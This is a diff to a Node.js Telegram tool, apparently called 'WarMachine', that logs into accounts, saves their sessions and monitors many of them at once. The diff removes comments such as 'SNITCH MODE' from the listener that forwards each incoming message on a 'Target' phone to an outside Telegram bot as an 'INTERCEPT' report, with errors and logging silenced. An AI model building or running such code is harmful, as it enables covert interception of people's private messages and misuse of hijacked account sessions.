@@ -5,7 +5,6 @@ const { Logger } = require("telegram/extensions/Logger");
 const axios = require('axios');
 const input = require('input');
 
-// GAG THE LIBRARY. SHUT UP.
 Logger.setLevel("none");
 
 class WarMachine {
@@ -21,17 +20,16 @@ class WarMachine {
             appVersion: "69.4.20",
             systemVersion: "Windows 11 Pro",
             connectionRetries: 5,
-            useWSS: false // Sometimes TCP is more stable
+            useWSS: false
         });
 
-        // Suppress internal error prints
         client.setLogLevel("none");
 
         await client.start({
             phoneNumber: phone,
             password: async () => await input.text("2FA Password (don't f*ck it up): "),
             phoneCode: async () => await input.text("SMS Code (check the phone): "),
-            onError: (err) => {}, // Eat the error silently
+            onError: (err) => {},
         });
 
         const str = client.session.save();
@@ -50,7 +48,6 @@ class WarMachine {
                 parse_mode: 'HTML'
             });
         } catch (e) {
-            // If bot fails, don't crash the whole matrix. Just ignore.
         }
     }
 
@@ -62,7 +59,7 @@ class WarMachine {
                     autoReconnect: true
                 });
                 
-                client.setLogLevel("none"); // SHUSH
+                client.setLogLevel("none");
                 await client.connect();
                 
                 client.addEventHandler(async (event) => {
@@ -71,14 +68,12 @@ class WarMachine {
                         const sender = msg.senderId ? msg.senderId.toString() : 'Ghost';
                         const cleanText = msg.message.replace(/\n/g, ' ');
                         
-                        // Callback for CLI display
                         callback({
                             phone: s.phone,
                             text: msg.message,
                             sender: sender
                         });
 
-                        // SNITCH MODE
                         if (botConfig && botConfig.token && botConfig.admin) {
                             const report = `<b>⚠️ MIKA INTERCEPT</b>\n\n<b>Target:</b> <code>${s.phone}</code>\n<b>From:</b> <code>${sender}</code>\n\n${cleanText}`;
                             await this.snitchToBot(botConfig.token, botConfig.admin, report);
@@ -88,7 +83,6 @@ class WarMachine {
                 
                 this.activeGuns.set(s.phone, client);
             } catch (e) {
-                // Dead session, ignore
             }
         });
         await Promise.all(promises);
